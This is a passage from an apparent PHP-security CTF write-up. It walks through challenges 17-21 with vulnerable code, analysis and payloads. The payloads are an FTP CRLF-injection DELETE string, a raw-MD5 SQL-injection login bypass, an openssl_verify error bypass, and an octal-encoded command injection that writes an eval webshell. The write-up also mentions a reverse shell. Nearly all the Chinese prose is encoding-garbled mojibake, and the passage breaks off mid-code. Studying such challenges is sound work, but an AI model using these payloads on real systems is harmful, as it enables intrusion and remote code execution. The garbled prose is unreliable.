å¸¸ç”¨æŒ‡ä»¤ <a href="https://blog.csdn.net/weiyuefei/article/details/51758288" target="_blank" rel="noopener">ftpåè®®æŒ‡ä»¤é›†</a>  <a href="https://www.cnblogs.com/duanxz/p/5129153.html" target="_blank" rel="noopener">ftpåè®®è¯¦è§£</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">!               cr              macdef         <span class="built_in"> proxy </span>          send</span><br><span class="line">$               delete          mdelete         sendport        status</span><br><span class="line">account         <span class="builtin-name">debug</span>           mdir            put             struct</span><br><span class="line">append          dir             mget            pwd             sunique</span><br><span class="line">ascii           disconnect      mkdir           quit            tenex</span><br><span class="line">bell            form            mls             quote           trace</span><br><span class="line">binary          <span class="builtin-name">get</span>             mode            recv            type</span><br><span class="line">bye             glob            mput            remotehelp      user</span><br><span class="line">case            hash            nmap            rename          verbose</span><br><span class="line">cd              help            ntrans          reset           ?</span><br><span class="line">cdup           <span class="built_in"> lcd </span>            open            rmdir</span><br><span class="line">close           ls              prompt          runique</span><br></pre></td></tr></table></figure><p>å¯æƒœçš„æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œä¸èƒ½è¿›è¡Œä¸‹è½½äº†ï¼Œå…¶ä»–çš„æ–‡ä»¶å¤„ç†éƒ½èƒ½æ‰§è¡Œã€‚</p><p>å»çœ‹çœ‹å®˜æ–¹ <code>wp</code> å¯¹ <code>send()</code> æœ‰ä½•è§£é‡Šï¼Œæ²¡æƒ³åˆ°åªæ˜¯ç®€å•çš„è®²äº†å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶åˆ é™¤ã€‚</p><p>æœ€ç»ˆç±»ä¼¼çš„ payload ä¸ºï¼š<code>1%0a%0dDELETE%20test</code>ï¼Œå…¶ä¸­çš„ <code>DELETE</code> å¯æ›¿æ¢ä¸ºå…¶ä»–æŒ‡ä»¤ã€‚</p><h3 id="TODO-åŠ -file-åè®®æˆ–è®¸èƒ½ä¸Šä¼ æ–‡ä»¶ã€‚ä¸-ftp-çš„ä¸»è¢«åŠ¨æ¨¡å¼æœ‰å…³ï¼Œå¾…æ·±ç ”"><a href="#TODO-åŠ -file-åè®®æˆ–è®¸èƒ½ä¸Šä¼ æ–‡ä»¶ã€‚ä¸-ftp-çš„ä¸»è¢«åŠ¨æ¨¡å¼æœ‰å…³ï¼Œå¾…æ·±ç ”" class="headerlink" title="TODO: åŠ  file åè®®æˆ–è®¸èƒ½ä¸Šä¼ æ–‡ä»¶ã€‚ä¸ ftp çš„ä¸»è¢«åŠ¨æ¨¡å¼æœ‰å…³ï¼Œå¾…æ·±ç ”"></a>TODO: åŠ  file åè®®æˆ–è®¸èƒ½ä¸Šä¼ æ–‡ä»¶ã€‚ä¸ ftp çš„ä¸»è¢«åŠ¨æ¨¡å¼æœ‰å…³ï¼Œå¾…æ·±ç ”</h3><p>ç»“åˆ gopherï¼ŸFTPï¼ˆä¸èƒ½å®ç°ä¸Šä¼ ä¸‹è½½æ–‡ä»¶ï¼Œä½†æ˜¯åœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹å¯ç”¨äºçˆ†ç ´å†…ç½‘ FTPï¼‰</p><h2 id="17-Mistletoe"><a href="#17-Mistletoe" class="headerlink" title="17 - Mistletoe"></a>17 - Mistletoe</h2><blockquote><p>md5</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSecureLoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $em;</span><br><span class="line">    <span class="keyword">private</span> $user;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $pass = md5(<span class="keyword">$this</span>-&gt;password, <span class="keyword">true</span>);</span><br><span class="line">        $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line"></span><br><span class="line">        $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">                        -&gt;select(<span class="string">"COUNT(p)"</span>)</span><br><span class="line">                        -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">                        -&gt;where(<span class="string">"password = '$pass' AND user = '$user'"</span>);</span><br><span class="line">        $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">        <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> addslashes($input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> RealSecureLoginManager(</span><br><span class="line">    $_POST[<span class="string">'user'</span>],</span><br><span class="line">    $_POST[<span class="string">'passwd'</span>]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-16"><a href="#åˆ†æ-16" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æœ‰ <code>sql</code> è¯­å¥ï¼Œææœ‰å¯èƒ½æ˜¯æ³¨å…¥é¢˜ï¼Œ <code>user</code> è¢«è½¬ä¹‰ï¼Œæ³¨æ„åˆ° <code>md5($this-&gt;passwd, true)</code> ï¼Œæƒ³èµ·äº†ä¸€ä¸ª <a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">æ³¨å…¥é¢˜</a>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5 ( string $str [, bool $raw_output = <span class="keyword">FALSE</span> ] ) : string</span><br><span class="line">raw ä¸º <span class="keyword">TRUE</span> æ—¶ä¸º <span class="number">16</span> å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼Œé»˜è®¤ä¸º <span class="number">32</span> å­—ç¬¦åå…­è¿›åˆ¶æ•°</span><br></pre></td></tr></table></figure><h3 id="payload-15"><a href="#payload-15" class="headerlink" title="payload"></a>payload</h3><blockquote><p>hint: â€œselect * from admin where password=â€™â€.md5($pass,true).â€â€˜â€œ</p><p>å‚è€ƒ <a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="noopener">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><p>â€‹         <a href="http://www.am0s.com/functions/204.html" target="_blank" rel="noopener">http://www.am0s.com/functions/204.html</a></p><p>æœ‰ä¸ªç‰›é€¼çš„å­—ç¬¦ä¸²ï¼š ffifdyopï¼Œä¼ å…¥ä¹‹åï¼Œæœ€ç»ˆçš„ sql è¯­å¥å˜ä¸º </p><p>select * from admin where password=â€™â€™orâ€™6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bâ€™ æˆåŠŸé—­åˆï¼Œå¾—åˆ°ä¸‡èƒ½å¯†ç </p></blockquote><p>è¿™è¿˜æœ‰ä¸€ä¸ªæœ‰è¶£çš„æ•°å­—â€”â€”<code>128</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ php -r "var_dump(md5(128, true));"</span><br><span class="line">string(16) "vï¿½anï¿½ï¿½ï¿½lï¿½ï¿½ï¿½qï¿½ï¿½\"</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ«å°¾å‡ºç°äº†ä¸€ä¸ª <code>\</code> ï¼Œå°†æŠŠ <code>â€˜</code> åƒæ‰ï¼Œå†ç»“åˆä¸€ä¸‹ <code>user= or 1#</code></p><p>æœ€ç»ˆå°†å½¢æˆè¿™æ ·çš„è¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where password='vï¿½anï¿½ï¿½ï¿½lï¿½ï¿½ï¿½qï¿½ï¿½\' AND user = ' or 1<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="18-Sign"><a href="#18-Sign" class="headerlink" title="18 - Sign"></a>18 - Sign</h2><blockquote><p>openssl_verify</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JWT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyToken</span><span class="params">($data, $signature)</span> </span>&#123;</span><br><span class="line">        $pub = openssl_pkey_get_public(<span class="string">"file://pub_key.pem"</span>);</span><br><span class="line">        $signature = base64_decode($signature);</span><br><span class="line">        <span class="keyword">if</span> (openssl_verify($data, $signature, $pub)) &#123;</span><br><span class="line">            $object = json_decode(base64_decode($data));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loginAsUser($object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> JWT())-&gt;verifyToken($_GET[<span class="string">'d'</span>], $_GET[<span class="string">'s'</span>]);</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-17"><a href="#åˆ†æ-17" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>åˆæ˜¯ç™»å½•éªŒè¯ï¼Œå…ˆçœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl_pkey_get_public ( mixed $certificate ) : resource</span><br><span class="line"><span class="comment">// ä» certificate ä¸­è§£æå…¬é’¥ï¼Œä¾›å…¶ä»–å‡½æ•°ä½¿ç”¨</span></span><br><span class="line">    </span><br><span class="line">openssl_verify ( string $data , string $signature , mixed $pub_key_id [, mixed $signature_alg = OPENSSL_ALGO_SHA1 ] ) : int</span><br><span class="line"><span class="comment">// ä½¿ç”¨ä¸ pub_key_id å…³è”çš„å…¬é’¥éªŒè¯æŒ‡å®šæ•°æ® data çš„ç­¾å signature æ˜¯å¦æ­£ç¡®</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå¥½å¥½çš„å…¬é’¥éªŒè¯å‡½æ•°ä¼šæœ‰ä»€ä¹ˆæ¼æ´å‘¢ï¼Ÿå…ˆçœ‹å¦ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„ç‚¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">1</span>) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'hhh&lt;br&gt;'</span>;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'jjj'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡ºç»“æœï¼šhhh jjj éƒ½æœ‰</span></span><br><span class="line"><span class="comment">// æœ‰äººå¯èƒ½ä»¥ä¸ºå¤§äº 0 æ‰èƒ½è¿‡ ifï¼Œç„¶è€Œé 0 å³å¯</span></span><br></pre></td></tr></table></figure><p>æ‰‹å†Œä¸Šé¢çš„è§£é‡Š</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1btq7d85ej20nj0hxt9y.jpg" alt></p><p>å†å›åˆ° <code>openssl_verify()</code> </p><blockquote><p>å¦‚æœç­¾åæ­£ç¡®è¿”å› 1, ç­¾åé”™è¯¯è¿”å› 0, å†…éƒ¨å‘ç”Ÿé”™è¯¯åˆ™è¿”å›-1</p></blockquote><p>æ‰€ä»¥è¿™é‡Œåªè¦æ„é€ å‡ºå†…éƒ¨é”™è¯¯ï¼Œè‡ªç„¶å°±ç™»å½•æˆåŠŸäº†ã€‚</p><h3 id="payload-16"><a href="#payload-16" class="headerlink" title="payload"></a>payload</h3><p>æƒ³è®©å®ƒå‡ºé”™ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œåªéœ€ç”¨ä¸€ä¸ªå…¶ä»–çš„ <code>pub_key.pem</code> æ¥ç”Ÿæˆ <code>data</code> å’Œ <code>signature</code>ã€‚</p><h2 id="19-Birch"><a href="#19-Birch" class="headerlink" title="19 - Birch"></a>19 - Birch</h2><blockquote><p>stripcslashes</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageViewer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">"images/$file"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createThumbnail();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createThumbnail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $e = stripcslashes(</span><br><span class="line">            preg_replace(</span><br><span class="line">                <span class="string">'/[^0-9\\\]/'</span>,</span><br><span class="line">                <span class="string">''</span>,</span><br><span class="line">                <span class="keyword">isset</span>($_GET[<span class="string">'size'</span>]) ? $_GET[<span class="string">'size'</span>] : <span class="string">'25'</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        system(<span class="string">"/usr/bin/convert $this-&gt;file --resize $e ./thumbs/$this-&gt;file"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;a href=$this-&gt;file&gt; &lt;img src=./thumbs/$this-&gt;file&gt;&lt;/a&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageViewer(<span class="string">"image.png"</span>));</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-18"><a href="#åˆ†æ-18" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¸€ä¸ªç”Ÿæˆç¼©ç•¥å›¾çš„ç±»ï¼Œ<code>system()</code> æˆ–è®¸å¯ä»¥å‘½ä»¤æ³¨å…¥ï¼Œ<code>__toString()</code> å¯èƒ½æœ‰ <code>xss</code>ã€‚</p><p>å¯æƒœ <code>file</code> ä¸å¯æ§ï¼Œé‚£æˆ‘ä»¬ä»”ç»†çœ‹çœ‹ <code>size</code> ï¼Œè¿™æœ‰ä¸ªç‰¹åˆ«çš„å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stripcslashes ( string $str ) : string</span><br><span class="line"><span class="comment">// è¿”å›åè½¬ä¹‰åçš„å­—ç¬¦ä¸²ã€‚å¯è¯†åˆ«ç±»ä¼¼ C è¯­è¨€çš„ \nï¼Œ\rï¼Œ... å…«è¿›åˆ¶ä»¥åŠåå…­è¿›åˆ¶çš„æè¿°ã€‚</span></span><br></pre></td></tr></table></figure><p><code>/[^0-9\\\]/</code> åªèƒ½æœ‰æ•°å­—ã€åæ–œæ å’Œå³ä¸­æ‹¬å·ï¼Œä¸Šé¢é‚£å‡½æ•°èƒ½è¯†åˆ«åå…­è¿›åˆ¶ï¼Œ</p><p>ä½†åå…­è¿›åˆ¶ä¸­åŒ…å«å­—æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠå­—ç¬¦ä¸²è½¬æˆå…«è¿›åˆ¶è¯•è¯•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(stripcslashes(<span class="string">'\145\143\150\157\40\47\74\77\160\150\160\40\145\166\141\154\50\44\137\107\105\124\133\61\135\51\73\77\76\47\40\76\40\163\150\145\154\154\56\160\150\160'</span>));</span><br><span class="line"><span class="comment">// string(42) "echo '<span class="meta">&lt;?php</span> eval($_GET[1]);<span class="meta">?&gt;</span>' &gt; shell.php"</span></span><br><span class="line"><span class="comment">// å­—ç¬¦ä¸²ç›´æ¥è½¬å…«è¿›åˆ¶ä¸å¤ªå¥½è½¬ï¼Œå¯ä»¥å…ˆè½¬æˆURLï¼Œç„¶åè½¬æˆåè¿›åˆ¶ï¼Œå†è½¬å…«è¿›åˆ¶</span></span><br></pre></td></tr></table></figure><p>å¦å¤–ï¼Œ<code>system()</code> é‡Œå¯ä»¥æ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œç”¨ <code>;</code> åˆ†éš”ä¸€ä¸‹å³å¯ã€‚</p><p>å°è¯•å†™ä¸€ä¸ª <code>webshell</code> ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åå¼¹ä¸€ä¸ª <code>shell</code>ã€‚</p><p><code>stripcslashes()</code> è¿™éš¾é“ä¸æ˜¯å¤šæ¬¡ä¸€ä¸¾ï¼Œé™åˆ¶åªèƒ½ä¼ å…¥æ•°å­—ä¸å°±å¥½äº†ï¼Ÿä¸ºäº†å…¼å®¹ä¸åŒè¿›åˆ¶å—ï¼Ÿ</p><h3 id="payload-17"><a href="#payload-17" class="headerlink" title="payload"></a>payload</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size=<span class="number">0</span>\<span class="number">073</span>\<span class="number">145</span>\<span class="number">143</span>\<span class="number">150</span>\<span class="number">157</span>\<span class="number">40</span>\<span class="number">47</span>\<span class="number">74</span>\<span class="number">77</span>\<span class="number">160</span>\<span class="number">150</span>\<span class="number">160</span>\<span class="number">40</span>\<span class="number">145</span>\<span class="number">166</span>\<span class="number">141</span>\<span class="number">154</span>\<span class="number">50</span>\<span class="number">44</span>\<span class="number">137</span>\<span class="number">107</span>\<span class="number">105</span>\<span class="number">124</span>\<span class="number">133</span>\<span class="number">61</span>\<span class="number">135</span>\<span class="number">51</span>\<span class="number">73</span>\<span class="number">77</span>\<span class="number">76</span>\<span class="number">47</span>\<span class="number">40</span>\<span class="number">76</span>\<span class="number">40</span>\<span class="number">163</span>\<span class="number">150</span>\<span class="number">145</span>\<span class="number">154</span>\<span class="number">154</span>\<span class="number">56</span>\<span class="number">160</span>\<span class="number">150</span>\<span class="number">160</span>\<span class="number">073</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ‰§è¡Œçš„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/convert images/image.png --resize 0;echo '&lt;?php eval($_GET[1]);?&gt;' &gt; shell.php;</span><br></pre></td></tr></table></figure><p>å†™å…¥æˆåŠŸ</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1bxcudmt2j20r30fc0u1.jpg" alt></p><h2 id="20-Stocking"><a href="#20-Stocking" class="headerlink" title="20 - Stocking"></a>20 - Stocking</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">set_error_handler(<span class="function"><span class="keyword">function</span> <span class="params">($no, $str, $file, $line)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ErrorException($str, <span class="number">0</span>, $no, $file, $line);</span><br><span class="line">&#125;, E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getResult</span><span class="params">($uri)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!filter_var($uri, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;p&gt;Please enter valid uri&lt;/p&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $image = file_get_contents($uri);</span><br><span class="line">            $path = <span class="string">"./images/"</span> . uniqid() . <span class="string">'.jpg'</span>;</span><br><span class="line">            file_put_contents($path, $image);</span><br><span class="line">            <span class="keyword">if</span> (mime_content_type($path) !== <span class="string">'image/jpeg'</span>) &#123;</span><br><span class="line">                unlink($path);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'&lt;p&gt;Only .jpg files allowed&lt;/p&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;p&gt;There was an error: '</span> .</span><br><span class="line">                $e-&gt;getMessage() . <span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> . $path . <span class="string">'" width="100"/&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageLoader())-&gt;getResult($_GET[<span class="string">'img'</span>]);</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-19"><a href="#åˆ†æ-19" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å…ˆçœ‹çœ‹å¼€å¤´è¿™ä¸ªè®¾ç½®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set_error_handler ( callable $error_handler [, int $error_types = E_ALL | E_STRICT ] ) : mixed</span><br><span class="line"><span class="comment">// è®¾ç½®ç”¨æˆ·çš„å‡½æ•° (error_handler) æ¥å¤„ç†è„šæœ¬ä¸­å‡ºç°çš„é”™è¯¯ã€‚</span></span><br><span class="line"><span class="comment">// æœ¬å‡½æ•°å¯ä»¥ç”¨ä½ è‡ªå·±å®šä¹‰çš„æ–¹å¼æ¥å¤„ç†è¿è¡Œä¸­çš„é”™è¯¯ï¼Œ ä¾‹å¦‚ï¼Œåœ¨åº”ç”¨ç¨‹åºä¸­ä¸¥é‡é”™è¯¯å‘ç”Ÿæ—¶ï¼Œæˆ–è€…åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è§¦å‘äº†ä¸€ä¸ªé”™è¯¯(ä½¿ç”¨ trigger_error())ï¼Œä½ éœ€è¦å¯¹æ•°æ®/æ–‡ä»¶åšæ¸…ç†å›æ”¶ã€‚</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜ç‰¹æ„è®¾ç½®äº† <code>E_ALL</code> ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰€æœ‰çš„é”™è¯¯éƒ½ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œå°†é”™è¯¯ä¿¡æ¯å…¨æš´éœ²å‡ºæ¥æ˜¯ä¸€ä¸ªæå…¶ä¸æ˜æ™ºçš„é€‰æ‹©ï¼Œè¿™äº›æŠ¥é”™å¯¹æ­£å¸¸ç”¨æˆ·æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œåè€Œä¼šç»™æ”»å‡»è€…æä¾›æ›´å¤šçš„ä¿¡æ¯ã€‚</p><p>ä¸ä»…ä»…æ˜¯ SSRF ï¼Œè‚¯å®šæœ‰æ›´å¥½ç©çš„ï¼Œå…ˆæ”¾ä¸€ä¸‹ã€‚</p><h2 id="21-Gift-Wrap"><a href="#21-Gift-Wrap" class="headerlink" title="21 - Gift Wrap"></a>21 - Gift Wrap</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParamExtractor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $validIndices = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">indices</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        $validate = <span class="function"><span class="keyword">function</span> <span class="params">(int $value, $key)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;validIndices[] = $key;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            array_walk($input, $validate, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (TypeError $error) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Only numbers are allowed as input"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;validIndices;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCommand</span><span class="params">($parameters)</span> </span>&#123;</span><br><span class="line">        $indices = <span class="keyword">$this</span>-&gt;indices($parameters);</span><br><span class="line">        $params = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($indices <span class="keyword">as</span> $index) 